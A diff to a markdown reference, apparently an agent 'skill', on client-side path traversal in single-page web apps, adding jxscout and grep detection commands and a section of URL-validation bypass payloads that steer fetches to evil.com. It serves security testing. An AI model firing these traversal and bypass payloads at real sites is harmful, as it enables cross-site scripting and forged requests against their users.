@@ -147,8 +147,15 @@ axios.get(`/api/v1/${resource}/${id}`)          // resource + id from URL
 $.get(`/data/${window.location.hash.slice(1)}`) // hash fragment
 ```
 
-**Grep patterns in JS bundles:**
+**Detection with jxscout:**
 ```bash
+jxscout-pro-v2 -c get-matches --kind fetch-url-injection
+jxscout-pro-v2 -c get-matches --kind dynamic-api-path
+```
+
+**Manual grep patterns:**
+```bash
+# In downloaded JS bundles
 rg 'fetch\s*\(`[^`]*\$\{' --type js
 rg 'axios\.(get|post|put)\s*\(`[^`]*\$\{' --type js
 rg '\.get\s*\([^)]*location\.' --type js
@@ -169,7 +176,7 @@ Systematic approach when you don't have source access:
 7. Assess impact: DOM insertion (XSS) or state-change (CSRF)
 ```
 
-**Confirm HTML injection:** Use an intercepting proxy's match-and-replace to inject `<img src=x>` into the API response body. If the SPA renders the image, the sink is confirmed.
+**Confirm HTML injection:** Use Caido match-and-replace to inject `<img src=x>` into the API response body. If the SPA renders the image, the sink is confirmed.
 
 ### 3. Path Traversal to Arbitrary Endpoint
 
@@ -317,8 +324,29 @@ If CDN caches API responses and the first request had no `Origin` header, the ca
 - unicode-normalization-bypass — NFKC normalization may decode traversal chars post-filter
 - parser-differential-bypass — different layers parse the same URL differently
 
+## URL Validation Bypass (for CSPT through validated fetch URLs)
+
+When the SPA validates the constructed URL before fetching (e.g. allowlisted hosts), combine CSPT traversal with URL validation bypasses:
+
+```
+# Userinfo confusion — traverse then embed allowed host as userinfo
+fetch("/api/" + param)  →  param = "../../evil.com%23@allowed.com"
+
+# Backslash confusion — some URL parsers treat \ as path separator
+param = "..%5C..%5Cevil.com"
+
+# Fragment injection — parser sees allowed host after #
+param = "../../evil.com%23@allowed.com/payload"
+
+# Scheme-relative — bypass scheme validation
+param = "../..//evil.com/xss.json"
+```
+
+See `ssrf-ip-filter-bypass` skill for the full URL validation bypass matrix (userinfo, backslash, fragment, scheme, DNS rebinding, open redirect chains). The same techniques apply when CSPT targets a fetch URL that undergoes host validation.
+
 ## Reference
 
+- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
 - https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-168-client-side-path-traversals-across-every-framework-with-xssdoctor
 - https://vitorfalcao.com/posts/hacking-high-profile-targets/
 - https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/
